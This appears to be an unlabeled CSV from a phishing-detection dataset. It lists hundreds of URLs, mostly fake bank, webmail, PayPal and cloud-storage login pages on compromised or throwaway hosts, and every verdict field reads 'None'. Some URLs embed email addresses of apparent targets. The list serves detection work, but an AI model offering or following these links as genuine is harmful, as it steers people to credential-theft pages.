url,verdict
https://legenevyu.duckdns.org/uu/yahoo/f8187a7a2be2e2e654b504a99a505b90/index2.php,None
https://nunoquelhas.eu/wp-includes/pomo/www/my/b4912cb7a103d5aeb6bfbe23d1772e3c/Update-YourID.html,None
http://www.tuauto.cool/js/auto-aviso/banco-inter.com.br/_sincronia.php,None
http://vijayintercontinental.com/logos/slim/i/aut.php,None
http://213.246.62.244/plesk-site-preview/palobjects.webscr.sceiw.ds.hotelsanhaja.com/213.246.62.244/css/54c150/en/season.php,None
http://sdiciquen.uk/index/bankofamerica/e373f81c/signOnV2Screen.php,None
https://interventionist-mit.000webhostapp.com/Regions/Regions/signOnV2Screen.go/login/,None
http://sacbadlands.com/wordpress/wp-admin/en/que.php,None
http://batdongsankhudong.org/nboa/7bcf0e55be86f7a8dcfc95ab0e18ae96/,None
http://adminservice.icu/bankofamerica/,None
http://www.free-all.it/nl.php,None
http://anandamritrajworld.com/gri/creativity,None
http://telecommunicationsaustralia.com.au/cgi-home/mountain.america.credit.union.sign-202-path/macu.com.sure.login.latest/login.php?cmd=login_submit&id=78174accd9f3c0a020d3246a36dafbe578174accd9f3c0a020d3246a36dafbe5&session=78174accd9f3c0a020d3246a36dafbe578174accd9f3c0a020d3246a36dafbe5,None
https://cryptonewstoday.co/Supporrt/Confirm/signin/login/bank.php,None
https://kucing-persia.com/file.exe/,None
http://sensejasd.duckdns.org/,None
https://inmobiliariamarzano.com/ch/share/verification.php?sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd,None
http://mynt.com.mt/x/portailas/fr/assure/somtc=true/6ca501e45102cb17b5d4a4615c98545c/sms.php,None
http://disnakkan.boyolali.go.id/wp-content/uploads/2018/12/Cox.billing/login/1/bill%20(2).php,None
http://yenyhc.com/plugins/login/page/index.php?src=dluzdluzhnmndblb2rzadluzhnmnddblb2rzatrpzwprmzbka2przwtjamtkignuzmk0bmzpbtrpzwprmzbka2przwtjamtkignuzmk0bmzpbhnmndblb2rzatrdluzhnmndblb2rzatrpzwprmzbka2przwtjamtkignuzmk0bmzpbpzwprmzbka2przwtjamtkignuzmk0bmzpbzwppzxdpb2u5ndluzhnmndblb2rzatrpzwprmzbka2przwtjamtkignuzmk0bmzpb25ja29uc2nrigtjigtqihzqaybj%26access=nakilat@kotc.com.kw,None
https://legenevyu.duckdns.org/uu/yahoo/f8187a7a2be2e2e654b504a99a505b90/,None
https://verifyscan.pw/Email_Updating_Secured/success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1,None
http://homestaymy.tk/morningmonday/Yahoo_Verification/,None
https://bekhatchphotography.com/wordpress/wp-content/plugins/suntrust/,None
http://beverlyperkins.com/wordpress/wp-content/plugins/ubh/facebook.security,None
https://legenevyu.duckdns.org/uu/yahoo/10c7701190bd1e58194bed0577bff249/,None
http://www.mba-icmmadurai.in/include/kevo/baba/conflict.php,None
http://039574501.com/yt/index.htm,None
http://pracowniaroznosci.pl/st/verification/444MDM54CB9334B6D4A2/acc_ver.php,None
http://cpaglobal.world/wps-admin/Wetransfer/cgi/,None
https://bekhatchphotography.com/wordpress/wp-content/plugins/suntrust/login.php?cmd=login_submit&id=2add408fa39fbf752a8ca62f2a7796ff2add408fa39fbf752a8ca62f2a7796ff&session=2add408fa39fbf752a8ca62f2a7796ff2add408fa39fbf752a8ca62f2a7796ff,None
https://www.volksbank.tirol/unternehmer/zahlungsverkehr/digitales-volksbank-banking,None
http://kennedyrefrigeration.com/x/mg.mail.yahoo.com/yahoo/yahoo/yahoo/yahoo/d5e06475cbfd2902bc6a8dc6c4e6a5bc/index2.php,None
http://onedrive.bernaflasdisk.id/verification.php,None
http://www.srglobalgroup.com/wp-content/plugins/contact-widgets/includes/Officedoc-october/,None
https://lokiuty.live/assasa/ama/ACCESS744558886441BNG5F7558DERS85699SVB/F96db724ce5e888c86318f644bebcf629/websec.php?dispatch=,None
http://merakiuganda.com/wp-admin/includes/FAC/gmail/page2.php,None
http://trimarian.org/ames/attt/att.html,None
http://onedrive.bernaflasdisk.id/login.php?cmd=login_submitu0026id=2a3d53517d328dd283e7abfebd819e062a3d53517d328dd283e7abfebd819e06u0026session=2a3d53517d328dd283e7abfebd819e062a3d53517d328dd283e7abfebd819e06,None
http://crowntrade.ca/wps-admin/Wetransfer/cgi,None
http://tealtuesday.com/amelli/index3.php,None
http://www.chiedimitutto.info/wp-content/plugins/testimonial-builder/FastNet/update,None
https://trimandhiri.com/nab-device-1/28e3dff56a1bbffc57a023602f39c627/tcsreg1.html,None
https://legenevyu.duckdns.org/uu/yahoo/51cd2f481605f40328263209134ec1b3/index2.php,None
http://www.moov3.com.br/vs/wp-includes/login.php?cmd=login_submit&id=f60f9687e0577d6d6c4287cfe9dc85f2f60f9687e0577d6d6c4287cfe9dc85f2&session=f60f9687e0577d6d6c4287cfe9dc85f2f60f9687e0577d6d6c4287cfe9dc85f2,None
http://login.airbnb.esarpsatinal.com/rll,None
https://office.security.salfordsp.org.uk/step2.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&fid.13InboxLight.aspxn.1774256418&fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&userid,None
https://facilitative-fundin.000webhostapp.com/Regions/Regions/signOnV2Screen.go/login/details.html,None
https://asowqocpzc.uk/tx/dieseltax/tax/bnc/National%20Bank%20Online.html,None
http://prineray.duckdns.org/directing/www.atbonline.com/ATB/login.html,None
https://lostinths.icu/images/work/img/New%20bt%20page/index.htm,None
http://hpshowroompune.in/Wells/login.php?cmd=login_submit&id=067d99e112c8d08fbd4490f7606bc54c067d99e112c8d08fbd4490f7606bc54c&session=067d99e112c8d08fbd4490f7606bc54c067d99e112c8d08fbd4490f7606bc54c,None
http://banoonotash.com/wordpress/wp-content/themes/twentyfourteen/inc/ss/view.html?Go=_Reason=Limited&_SESSION=&_Email=,None
http://vaxincol.com/wp-exclude/nrb.html,None
http://perloading-accounts.gq/acceptr/on/bnc/National%20Bank%20Online.html,None
https://bitememnfgrd.com/login.php,None
http://2017.stephenwhyte.com/match/index.html,None
http://www.ferretotal.com/mn/gmx/,None
http://srodkidlagastronomii.pl/s/Stripe/verification/1BD5C1M892D1335A05AE/index.php?country_x=-&lang_x=en,None
http://vaxincol.com/wp-exclude/arb.html,None
https://eslybya.eu/PayPalSecurity/info/my/identity.php?cmd=_account-details&session=76a9c41434499751220f0efb7c7c4ae2&dispatch=4a8dd11dafc53911e9f7d2e916404a4936d959f6,None
http://www.museoroviano.it/wp-includes/js/jcrop/29064768df4e17e34ad8b937498c4924,None
http://lonbv-624.gq/serviceconnectsqlweb.connectconfirmwebnet/bvalidate.sql.net.log.cqconnect/mvcnetsecured.connectsecured.confirmedsqlverifyq/confirmnetconnectq.configsecurednetsqlsever.connect/online/index2.html,None
http://merakiuganda.com/wp-admin/includes/FAC/gmail/password.php,None
http://schn2009.nichost.ru/license/SECJ/bnd/challengevdl.php?cmd=_account-details&session=eae1589c16ee0e0af67a6e9a961e30cc&dispatch=e51cd3b1aa320f202f2e355ff22f9d8431391a76,None
https://m.bhilwarasamachar.in/kr/acc0unt/komail.php?email=saint@saint-al.com,None
https://trimandhiri.com/nab-device-1/28e3dff56a1bbffc57a023602f39c627/tcsreg2.html,None
https://bekhatchphotography.com/wordpress/wp-content/plugins/suntrust/surf2.php,None
http://delhibulksms.co/payment03924/directing/www.cibc.mobi/ebm-mobile-anp/account.php,None
http://rawi.co.za/wp-includes/images/Box/login.php,None
http://intramural-entries.000webhostapp.com/cox/cox/cox,None
https://lokiuty.live/assasa/ama/ACCESS744558886441BNG5F7558DERS85699SVB/Fe6288429576afc2a6d7d0378c2397365,None
https://eslybya.eu/PayPalSecurity/info/Billing.php?cmd=_account-details&session=af73433f61561c5d3c599da946bbf13d&dispatch=8601046127d42353310c81b1100568320d276661,None
http://imadubai.com/SS/point/share/index2.php,None
https://madmetalinversiones.com/mx/?r_8=jdeck@1300webpro.com.au,None
http://hpshowroompune.in/Wells/login.php,None
http://beverlyperkins.com/wordpress/wp-content/plugins/ubh/facebook.security/,None
http://onlinebanking.scotiabank.ca1f6befcf.gq/Scotia/Verify,None
http://cfsparts1-clients.fr/vclients/impots.gouv/HR0cHM6Ly9jZnNwYXJ0LmltcG90cy5nb3V2LmZyLw==/8936380ceda05b4fa384ad9fdd237ba8/remboursement.php,None
http://localized-offenders.000webhostapp.com/53rd/log/index.html?template=af706d976ee6a18b654fc95fa16443f8=Initiate&valid=true&session=ddaf706d976ee6a18b654fc95fa16443f8,None
http://pracowniaroznosci.pl/st/verification/743540D5M79569E4590M/index.php?country_x=US-United+States&lang_x=en,None
https://medium-begans.ml/aaaa/attiinnddeexx.html,None
http://prineray.duckdns.org/directing/www.atbonline.com/ATB/logging.php,None
http://www.tuauto.cool/js/auto-aviso/banco-inter.com.br/dados.php,None
http://worldfamilyinternational.com/includes/mod_secure/case=id1FDKFEJRFRE5F15R1/2dff9b08a87db9b9eb0dfbceced13067/,None
http://telecommunicationsaustralia.com.au/cgi-home/mountain.america.credit.union.sign-202-path/macu.com.sure.login.latest/login.php?cmd=login_submit&id=40b7928f42cb00933be3f6274a4e237a40b7928f42cb00933be3f6274a4e237a&session=40b7928f42cb00933be3f6274a4e237a40b7928f42cb00933be3f6274a4e237a,None
https://www.naturalocity.com/d35.jsh37183-gm.378YHDH9YE6372.DMDJ83.287gfgyYE.329-732.Chase3.1837681Jhdm.sdhjsh78387283.mndjshy-187381.NXNjdh2287382.3/login.php?cmd=login_submit&id=16f3f041649dbc9c906f785338b16acc16f3f041649dbc9c906f785338b16acc&session=16f3f041649dbc9c906f785338b16acc16f3f041649dbc9c906f785338b16acc,None
http://rapidpaws.com/wp-content/verify_mail/komail%20..php,None
https://txroofbid.com/donteypo/onedrive/error/Connect2erroe.php,None
http://mynt.com.mt/x/portailas/fr/assure/somtc=true/c3d50cd55bf0b6c5a12f8d2a52fd8684/sms2.php,None
http://shyambaba.org/manamsn/aol/auto,None
http://egentic.com.br/wp-content/uploads/2016/01/denmark/index.php,None
http://downsizingthenest.com.au/oxb/576890/nnm09/New.P0/yt/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product-userid&userid=,None
http://batdongsankhudong.org/nboa/7bcf0e55be86f7a8dcfc95ab0e18ae96/confirm.php,None
http://sdiciquen.uk/index/bankofamerica/942f68b5/challengevdl.php?cmd=_account-details&session=a3f59dcdb46a7199b0af1dbf5ecadf0d&dispatch=ec6c89295759671f037782a0fadc1691e1a2f15a,None
http://adcossalvador.com.br/gen/boxnotice.htm,None
http://gnclabs.com/adminwestpac/home/index.htm,None
http://adobespringsoliveoil.com/wp-content/themes/admin,None
http://shlyunko.zyr.su/news/microsoftexcelverification/login.php?amp;id=8940985086c5cc7e308e642da9258b868940985086c5cc7e308e642da9258b86%26amp;session=8940985086c5cc7e308e642da9258b868940985086c5cc7e308e642da9258b86%26cmd=login%5fsubmit,None
https://asowqocpzc.uk/tx/dieseltax/tax/cibc/logging.php,None
https://www.daniellestahl.com.au/lanaOLD/bluadmin/images/icons/fresh/sco/index.html,None
http://prineray.duckdns.org/directing/www.atbonline.com/ATB/question.php,None
http://ni2326129-1.web19.nitrado.hosting/ddsd/ING/ingdirect.es/,None
http://cervar-porat.com.hr/wp-includes/js/tinymce/plugins/wpeditimage/admin,None
http://librecoach.com/templates/beez3/bankofamerica.index.recover-my-password-online.access.info/confirm.php?cmd=login_submit&id=c9ac6787e6470319046962d35ab8b12fc9ac6787e6470319046962d35ab8b12f&session=c9ac6787e6470319046962d35ab8b12fc9ac6787e6470319046962d35ab8b12f,None
http://championdiamonds.com/private/index.php,None
https://worldgames.me/upp/office/login.php?fid.125289964252813InboxLight99642_Product-userid&fid.13InboxLight.aspxn.1774256418&l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&userid=,None
https://galleryex.com/f/amazon/pages/Amazon/,None
https://pat-instructor.000webhostapp.com/Regions/Regions/signOnV2Screen.go/login/,None
http://narodnaya-reklama.ru/templates/Wetransfer/new.php,None
https://thezargqz.com/canadarevenu/taxb/cibc/index.php,None
https://shlyunko.zyr.su/news/microsoftexcelverification/verification.php,None
https://eslybya.eu/PayPalSecurity/info/Billing.php?cmd=_account-details&session=985ac7f27474c5c3358d91c54e35c74d&dispatch=a416d0671dc8ef62659d281082eb5689e17db21f,None
https://legenevyu.duckdns.org/uu/yahoo/9f503926b197c48d317cfcc746584722/index2.php,None
http://pracowniaroznosci.pl/st/verification/1AEB84MA8MAEBA1B6DE8/acc_ver.php,None
https://colmoboeicz.com/jh/Step2_OTP.html,None
http://dintaan.com/fayr/Docusign/indexg.php,None
http://kennedyrefrigeration.com/x/mg.mail.yahoo.com/yahoo/yahoo/yahoo/yahoo/,None
http://www.sfr-remboursement.fr.keoirue.com/dolr145/elrok451/index2.php?page=,None
https://llaccountservuce.online/RSA/bnc/National%20Bank%20Online.html,None
https://bdss.edu.bd/wp-admin/index.php,None
https://bekhatchphotography.com/wordpress/wp-content/plugins/suntrust/login.php?cmd=login_submit&id=aebebaa50d69db26cddcda0b62506297aebebaa50d69db26cddcda0b62506297&session=aebebaa50d69db26cddcda0b62506297aebebaa50d69db26cddcda0b62506297,None
https://shib-bu.com/login/webmail/Webmail_Login.html,None
http://www.simeenergia.eu/Joomlapubblico/administrator/roots/korea/korean/pass.php,None
http://lotusapps.net/wordpress/business/wp-content/themes/auth/view/share,None
https://maisoncontino.com/modules/jmsslider/views/now/nikxsboa/login.php?cmd=login_submit&id=60cc4905951f7d3edb82cdb89cd42ad860cc4905951f7d3edb82cdb89cd42ad8&session=60cc4905951f7d3edb82cdb89cd42ad860cc4905951f7d3edb82cdb89cd42ad8,None
http://chiatena.zxy.me/resume/dir/auth/view/document/,None
https://directlinegroupcareers.career-inspiration.com/app/discussions/chat/view/1bc0249a6412ef49b07fe6f62e6dc8de/learn-about-careers-at-direct-line-group-and-our-application-process-20190220-1602,None
http://zulfikikosunmoon.com/HUD/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product-userid&userid=,None
http://prineray.duckdns.org/directing/www.cibc.mobi/ebm-mobile-anp/accountConfirm.php,None
http://hpshowroompune.in/Wells/step2.php,None
http://rogeracc.net/newemt/atb/index.html,None
https://oresces.000webhostapp.com/recovery-logins.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed,None
http://telecommunicationsaustralia.com.au/cgi-home/mountain.america.credit.union.sign-202-path/macu.com.sure.login.latest/surf3.php,None
https://telusbill.store/banks/National/,None
https://zomiouh.gq/update/NEWYAHOO/Yahoo!MailUpgrade.html,None
http://www.moov3.com.br/vs/wp-includes/,None
http://tuckervalveseat.com/modules/color/drive/Wetransfer/Validation,None
http://gpswami.org/ourtime/ourtime.com/ourtime.html,None
http://tiki-craft.com/CD/login.microsoftonline.comcommon.oauth.auth/?email=juan.viera@oportun.com,None
http://lvibrations.com/next/chines/chines/index.php?login=reutv@dor-chem.com,None
https://facilitative-fundin.000webhostapp.com/Regions/Regions/signOnV2Screen.go/login/,None
http://telecommunicationsaustralia.com.au/cgi-home/mountain.america.credit.union.sign-202-path/macu.com.sure.login.latest/login.php?cmd=login_submit&id=c4e948dc49a56c032cb09866498b9b40c4e948dc49a56c032cb09866498b9b40&session=c4e948dc49a56c032cb09866498b9b40c4e948dc49a56c032cb09866498b9b40,None
http://pracowniaroznosci.pl/st/verification/743540D5M79569E4590M/acc_ver.php,None
https://stallionfoxroad.cf/NewProject/b3b66e8ed6cb93a504426f4901cada0c/login.htm?cmd=login_submit&id=42f9b34801b90949bae582f47535845c42f9b34801b90949bae582f47535845c&session=42f9b34801b90949bae582f47535845c42f9b34801b90949bae582f47535845c,None
https://phooniwat.tk/imgs/secure/sm/new-secure/50202af93ef2300b60031954b744b66c/SecAuthInformation.php,None
https://saprogenic-shot.000webhostapp.com/Regions/Regions/signOnV2Screen.go/login/details.html,None
http://annnisarahmawati.id/wp-includes/pomo/amx/security/user/log/139b438cdd0358f5e441229bbc340934,None
https://phooniwat.tk/imgs/secure/sm/new-secure/50202af93ef2300b60031954b744b66c/confirmed.html,None
http://librecoach.com/templates/beez3/bankofamerica.index.recover-my-password-online.access.info/confirm.php?cmd=login_submit&id=1a7185bdfa00c1e3ab877e1d71418c131a7185bdfa00c1e3ab877e1d71418c13&session=1a7185bdfa00c1e3ab877e1d71418c131a7185bdfa00c1e3ab877e1d71418c13,None
http://login.airbnb.esarpsatinal.com/authenticate,None
https://eslybya.eu/PayPalSecurity/info/Credit%20card.php?cmd=_account-details&session=cea95f402ddf174d284225b2faa74755&dispatch=93228357f88afbb8b67e937ef331918e2e3c2891,None
https://verifyscan.pw/Email_Updating_Secured/aut.php?email=nobody@example.com,None
https://cryptonewstoday.co/Supporrt/Confirm/signin/login/thanks.php,None
http://smallbiznku.com/nnukwunwanebrida/ousemat/howbodysneh/win/all/yt/login.php?l=_JeHFUq_VJOXK0QWHtoGYDw1774256418&fid.13InboxLight.aspxn.1774256418&fid.125289964252813InboxLight99642_Product-userid&userid=,None
http://cervar-porat.com.hr/wp-includes/js/tinymce/plugins/wpeditimage/admin/surf2.php,None
https://asowqocpzc.uk/tx/dieseltax/tax/cibc/accountConfirm.php,None
http://librecoach.com/templates/beez3/bankofamerica.index.recover-my-password-online.access.info,None
http://www.catherinesflowers.co.za/dett/wp-includes/login.php?cmd=login_submit&id=8111b11c469e36ae1efe4769cc9727ba8111b11c469e36ae1efe4769cc9727ba&session=8111b11c469e36ae1efe4769cc9727ba8111b11c469e36ae1efe4769cc9727ba,None
http://pracowniaroznosci.pl/st/verification/1AEB84MA8MAEBA1B6DE8/index.php?country_x=US-United%20States&lang_x=en,None
http://huntermkt.com/wp-content/plugins/contact-form-7/includes/ali/login.php?cmd=login_submit&id=f4dee51bc3e3fba0aa9c1138dde29556f4dee51bc3e3fba0aa9c1138dde29556&session=f4dee51bc3e3fba0aa9c1138dde29556f4dee51bc3e3fba0aa9c1138dde29556,None
http://clt-ameli-assurance.center/auth_connection/fedf0fbce544c1354a09f5425a107338/Portails_Clients/sms.php,None
http://winscafltd.tk/txtp/adobecloud/error.php,None
http://zulfikikosunmoon.com/HUD/step2.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&fid.13InboxLight.aspxn.1774256418&fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&userid,None
https://lokiuty.live/assasa/ama/ACCESS744558886441BNG5F7558DERS85699SVB/F96db724ce5e888c86318f644bebcf629,None
http://datarescue.cl/bace/9dce77c1feda3f76651676891a0fbde9/?.verify?service=mail&data:text/html=&login=,None
http://hairblog.fr/wp-content/laye/css/orange-new/c3185eb550b1de7550683b57ef98e3bc/,None
https://empreendimentomaraba.com/secure-interact/directing/National/index.html,None
https://maisoncontino.com/modules/jmsslider/views/now/nikxsboa/step2.php,None
http://huntermkt.com/wp-content/plugins/contact-form-7/includes/ali/index.php,None
http://meetwomen.com/member%20downloads/ku.edu/314d8356ac6af919279747f05c954f83,None
http://telecommunicationsaustralia.com.au/cgi-home/mountain.america.credit.union.sign-202-path/macu.com.sure.login.latest/surf2.php,None
https://legenevyu.duckdns.org/uu/yahoo/8c7d0bb4949657551e88971c890f062b/index2.php,None
http://kkmcompetitionclasses.com/sdsmt,None
http://cormiersinkenya.org/wp/my/accounts.navyfederal.orgNFCU/index2.php,None
http://sdiciquen.uk/index/bankofamerica/e373f81c/overviewshn.php?cmd=_account-details&session=b21fd592e86f3477488d12b6599d22ef&dispatch=33ccb50123ea017470813a9dbd9fe8d94f5623db,None
https://legenevyu.duckdns.org/uu/yahoo/d731b6f7720897339cb0c9fd2ee85679/,None
http://vaxincol.com/wp-exclude/voorwaarden.html,None
https://interventionist-mit.000webhostapp.com/Regions/Regions/signOnV2Screen.go/login/details.html,None
http://ellesmerefamilyhealth.com/Apple/ed8781fb89/card.php,None
https://n-psy-t.com/casto/login.php?cmd=login_submit&id=642874264166c2c990693aac1e836f6a642874264166c2c990693aac1e836f6a&session=642874264166c2c990693aac1e836f6a642874264166c2c990693aac1e836f6a,None
http://sdiciquen.uk/index/bankofamerica/e373f81c/challengevdl.php?cmd=_account-details&session=d9ea17fd5af662a49f46ad43fb45437c&dispatch=869d9088e1db61341381df1b10da57df415ecda3,None
http://tealtuesday.com/amelli/merci.php,None
http://gnclabs.com/adminwestpac/home/login.php,None
https://bitememnfgrd.com/step2.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&fid.13InboxLight.aspxn.1774256418&fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&userid,None
https://colmoboeicz.com/jh/verify.php,None
http://www.catherinesflowers.co.za/dett/wp-includes/,None
https://thezargqz.com/canadarevenu/taxb/cibc/accountConfirm.php,None
http://datarescue.cl/bace/4f85fe35a6b356dec36639ec94c1f869,None
http://www.tuauto.cool/js/auto-aviso/banco-inter.com.br/sincronia.php,None
http://simplestepstospeakingsuccess.com/step2.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&fid.13InboxLight.aspxn.1774256418&fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&userid,None
http://smartjobshub.com/wp-includes/Requests/Transport/Support/Assurez/securite/Neteller/member.neteller.com/6f6dd5a3b04053d5bbf6b1f09/index.php,None
https://tabbykitty.co.za/asdfd/delivery.php?rand=13InboxLightaspxn.1774256418&fid&1252899642&fid.1&fav.1&email=,None
https://guidianoffox.top/Mial/secure-domains/document,None
http://tealtuesday.com/amelli/index2.php,None
http://greenworldtravel.com.pk/newpaper/paper,None
http://ellesmerefamilyhealth.com/Apple/50dcb8d39d/card.php,None
https://office.security.salfordsp.org.uk/login.php,None
http://indratamamandiri.com/bmwgh/y,None
https://trimandhiri.com/nab-device-1/,None
http://datarescue.cl/bace/9d3c98521e6350544152fc22dc7c028f,None
http://datarescue.cl/bace/af167731a3ee7b591c192812fc67d537,None
http://spectrumhospitalitysolutions.com/MATTER/tor,None
http://pracowniaroznosci.pl/st/verification/N0840AADE3MCA6BDE672/acc_ver.php,None
https://maisoncontino.com/modules/jmsslider/views/now/nikxsboa/login.php?cmd=login_submit&id=5c88cf3bacd6895ebdbc9f886772834c5c88cf3bacd6895ebdbc9f886772834c&session=5c88cf3bacd6895ebdbc9f886772834c5c88cf3bacd6895ebdbc9f886772834c,None
http://admakers.com/wp-content/upgrade/Secure.management,None
https://directlinegroupcareers.career-inspiration.com/app/discussions/chat/view/,None
http://pracowniaroznosci.pl/st/verification/444MDM54CB9334B6D4A2,None
http://zulfikikosunmoon.com/HUD/,None
https://thezargqz.com/canadarevenu/taxb/bnc/National%20Bank%20Online.html,None
http://www.nosewind.com/chase.com/chase.html,None
http://services-erca.com/media/Yahoo/yaho/yaho/f23c49a60444c8b8c1bcdcdc23d715f0/login.php?cmd=login_submit&id=3466bc71b012604a9387f7499ff1603d3466bc71b012604a9387f7499ff1603d&session=3466bc71b012604a9387f7499ff1603d3466bc71b012604a9387f7499ff1603d,None
http://avanua.pl/wp-includes/ID3/off/off.ice/service,None
http://astratest.live/new/chasenew/569376f0b28de23e989b8b278f651e07/email.php,None
https://www.daniellestahl.com.au/lanaOLD/bluadmin/images/icons/fresh/sco/reset.php,None
http://merakiuganda.com/wp-admin/includes/FAC/gmail/,None
https://vdertyl.com/verify/Ma/index2.php?service=mail&data:text/html;js6/main.jsp?sid=CAgbePXXjcVpfthPNgXXCcgDQZImqqTE&df=webmail163#module=welcome.WelcomeModule%7C%7B%7D=default&ltmplcache=2&emr=1&osid=1#identifier,None
http://services-erca.com/media/Yahoo/yaho/yaho/f23c49a60444c8b8c1bcdcdc23d715f0,None
http://bestwayinnsuites.com/office/login.php,None
https://e-journalmusic.icu/cig-bin/index2.php,None
http://www.sfr-remboursement.fr.keoirue.com/dolr145/elrok451/index3.php?page=,None
http://indothaitv.com/wp-includes/images/WEST/wstpc/step2.php,None
http://carfreemom.com/trustpass.html?email=shawn@osstem.com,None
http://www.isibinvest-plain.com/oladrive/td-bank/68f2552cce7a3f5dd85d720d0db2ee00/,None
http://adminservice.icu/bankofamerica/login.php?cmd=login_submit&id=9a52a711d4fea687652ba9f0c4a2d5bd9a52a711d4fea687652ba9f0c4a2d5bd&session=9a52a711d4fea687652ba9f0c4a2d5bd9a52a711d4fea687652ba9f0c4a2d5bd,None
http://pisqr.net/medic/www.loginalibaba.com/alibaba/alibaba/login.alibaba.com.php?email=baiyin004@xy51899.com%5Cr%5Cn,None
https://lumpflatedude.xyz/jr/bd.html,None
http://sdiciquen.uk/index/bankofamerica/942f68b5/overviewshn.php?cmd=_account-details&session=922aba6ef37f49968fa4203837c1d200&dispatch=3878442a1ffb52202645acc8429e9e929efc55b9,None
http://cre8signs.com/css/dropbox.htm/,None
http://xamhypermart.com/USER2020/memberos/surf3.php,None
